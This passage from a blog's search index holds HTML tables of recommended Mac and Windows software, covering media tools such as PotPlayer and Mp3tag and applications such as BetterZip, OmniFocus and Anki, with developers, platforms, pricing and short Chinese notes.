<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://www.babelsoft.net/products.htm" target="_blank" rel="external">Media Preview</a></td>
<td><a href="http://www.babelsoft.net/" target="_blank" rel="external">博语软件</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>资源管理器 视频缩略图</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://www.enfis.it/cue-splitter-tutorial/" target="_blank" rel="external">CUE Splitter</a></td>
<td><a href="http://www.medieval.it/" target="_blank" rel="external">Medieval Software</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>无损音乐分割</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://www.mp3tag.de/en/" target="_blank" rel="external">Mp3tag</a></td>
<td>Florian Heidenreich</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>MP3标签修改 去乱码</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="https://en.wikipedia.org/wiki/PotPlayer" target="_blank" rel="external">PotPlayer</a></td>
<td><a href="https://en.wikipedia.org/wiki/Kakao" target="_blank" rel="external">Daum Communications</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>视频播放</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://pic.2345.com/" target="_blank" rel="external">2345看图王</a></td>
<td><a href="2345.com">2345.com</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>图片浏览</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="http://www.pc6.com/softview/SoftView_77375.html" target="_blank" rel="external">魔方图标大师</a></td>
<td><a href="http://www.ruanmei.com/" target="_blank" rel="external">软媒</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>图标处理</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://www.crsky.com/soft/28076.html" target="_blank" rel="external">全能音频转换通</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>v1.2</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="https://en.wikipedia.org/wiki/Adobe_Photoshop" target="_blank" rel="external">Adobe Photoshop</a></td>
<td><a href="https://en.wikipedia.org/wiki/Adobe_Systems" target="_blank" rel="external">Adobe Systems</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">x</td>
<td>图像处理</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="http://www.arcsoft.com/photoplus/" target="_blank" rel="external">ArcSoft Photo+</a></td>
<td><a href="https://en.wikipedia.org/wiki/ArcSoft" target="_blank" rel="external">ArcSoft</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>图片浏览</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="https://en.wikipedia.org/wiki/Inpaint" target="_blank" rel="external">Inpaint</a></td>
<td><a href="http://www.theinpaint.com/" target="_blank" rel="external">Maxim Gapchenko</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">x</td>
<td>抠图，去背景</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="https://en.wikipedia.org/wiki/ScreenFlow" target="_blank" rel="external">ScreenFlow</a></td>
<td><a href="http://www.telestream.net/company/overview.htm" target="_blank" rel="external">Telestream, Inc.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>屏幕录制</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="http://www.faststone.org/FSCaptureDetail.htm" target="_blank" rel="external">FastStone Capture</a></td>
<td><a href="http://www.faststone.org/" target="_blank" rel="external">FastStone Soft</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>截图</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://baike.baidu.com/view/2343158.htm" target="_blank" rel="external">SplitIt</a></td>
<td><a href="http://user.qzone.qq.com/23192069" target="_blank" rel="external">poseidon</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>影音剪切合并</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="http://xee.c3.cx/" target="_blank" rel="external">Xee</a></td>
<td><a href="http://wakaba.c3.cx/s/" target="_blank" rel="external">Dag Ågren</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>图片浏览</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><a href="http://www.shuimiao.net/info.asp?id=157" target="_blank" rel="external">GIF动画录制精灵</a></td>
<td><a href="http://www.shuimiao.net/" target="_blank" rel="external">水淼软件</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><a href="http://baike.baidu.com/view/647184.htm" target="_blank" rel="external">MangaMeeya</a></td>
<td>Manga Underground</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>漫画阅读</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td><a href="http://www.benvista.com/photozoompro" target="_blank" rel="external">PhotoZoom</a></td>
<td><a href="http://www.benvista.com/aboutus" target="_blank" rel="external">BenVista Ltd.</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>图片无损缩放</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td><a href="http://www.snip.qq.com/" target="_blank" rel="external">Snip</a></td>
<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>截图</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td><a href="https://itunes.apple.com/us/app/covered/id860548294?mt=12" target="_blank" rel="external">Covered</a></td>
<td><a href="http://robheague.com/" target="_blank" rel="external">Rob Heague</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>专辑封面下载</td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td><a href="http://mediacoder.com.cn/" target="_blank" rel="external">MediaCoder</a></td>
<td>Stanley Huang</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>音视频转码</td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td><a href="https://www.bunkus.org/videotools/mkvtoolnix/" target="_blank" rel="external">MKVToolnix</a></td>
<td><a href="https://www.bunkus.org/blog/" target="_blank" rel="external">Moritz Bunkus</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>视频音频字幕处理</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td><a href="https://itunes.apple.com/app/id940107333" target="_blank" rel="external">iSmartPhoto</a></td>
<td>Chi Lin</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>图片管理</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td><a href="http://www.collageitfree.com/" target="_blank" rel="external">CollageIt</a></td>
<td>PearlMountain</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>拼图</td>
</tr>
<tr>
<td style="text-align:center">24</td>
<td><a href="https://itunes.apple.com/cn/app/bao-feng-ying-yin/id1035547244?mt=12" target="_blank" rel="external">暴风影音</a></td>
<td><a href="http://www.baofeng.com/" target="_blank" rel="external">暴风科技</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>Mac 版很简洁</td>
</tr>
<tr>
<td style="text-align:center">25</td>
<td><a href="http://mplayerx.org/" target="_blank" rel="external">MPlayerX</a></td>
<td><a href="http://blog.mplayerx.org/" target="_blank" rel="external">Zongyao Qu</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>视频播放</td>
</tr>
</tbody>
</table>
<h2 id="应用软件"><a href="#应用软件" class="headerlink" title="应用软件"></a>应用软件</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://www.betterzip.com/" target="_blank" rel="external">BetterZip</a></td>
<td><a href="http://macitbetter.com/" target="_blank" rel="external">MacItBetter</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>解压缩</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://haozip.2345.com/" target="_blank" rel="external">2345好压</a></td>
<td><a href="2345.com">2345.com</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>解压缩</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://us.blackberry.com/software/desktop/blackberry-blend.html" target="_blank" rel="external">BlackBerry Blend</a></td>
<td><a href="http://us.blackberry.com/" target="_blank" rel="external">BlackBerry</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>黑莓文件管理</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="http://www.noiz.io/" target="_blank" rel="external">Noizio</a></td>
<td>noiz.io</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>白噪音 声效</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="https://www.omnigroup.com/omnifocus/" target="_blank" rel="external">OmniFocus</a></td>
<td><a href="https://en.wikipedia.org/wiki/The_Omni_Group" target="_blank" rel="external">The Omni Group</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>GTD、任务管理</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="http://www.parallelsdesktop.cn/" target="_blank" rel="external">Parallels Desktop</a></td>
<td><a href="http://www.dwz.cn/27tepC" target="_blank" rel="external">Parallels</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>虚拟机</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="https://www.rescuetime.com" target="_blank" rel="external">RescueTime</a></td>
<td></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>时间流水记录</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="https://github.com/xsacha/Sachesi" target="_blank" rel="external">Sachesi</a></td>
<td><a href="https://github.com/xsacha" target="_blank" rel="external">xsacha</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>黑莓刷机</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="http://pinyin.sogou.com/" target="_blank" rel="external">搜狗输入法</a></td>
<td><a href="http://corp.sogou.com/" target="_blank" rel="external">搜狗</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="http://www.yibei.com/software" target="_blank" rel="external">易呗背单词</a></td>
<td><a href="http://www.yibei.com/" target="_blank" rel="external">易呗</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="http://www.443w.com/tts/" target="_blank" rel="external">朗读女</a></td>
<td><a href="http://www.443w.com/" target="_blank" rel="external">阿嘉</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>语音朗读</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="http://www.tongbusj.com/" target="_blank" rel="external">同步助手</a></td>
<td>宇通博软件</td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>iOS 设备管理</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://dict.youdao.com/" target="_blank" rel="external">有道词典</a></td>
<td><a href="http://baike.baidu.com/view/149363.htm" target="_blank" rel="external">网易公司</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="http://ankisrs.net/" target="_blank" rel="external">Anki</a></td>
<td><a href="http://ichi2.net/" target="_blank" rel="external">Damien Elmes</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>卡片辅助记忆</td>
</tr>
</tbody>
</table>
]]></content>
      
        <categories>
            
            <category> 来自MOxFIVE的优秀笔记 </category>
            
            <category> 软件推荐 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Mac </tag>
            
            <tag> Software </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
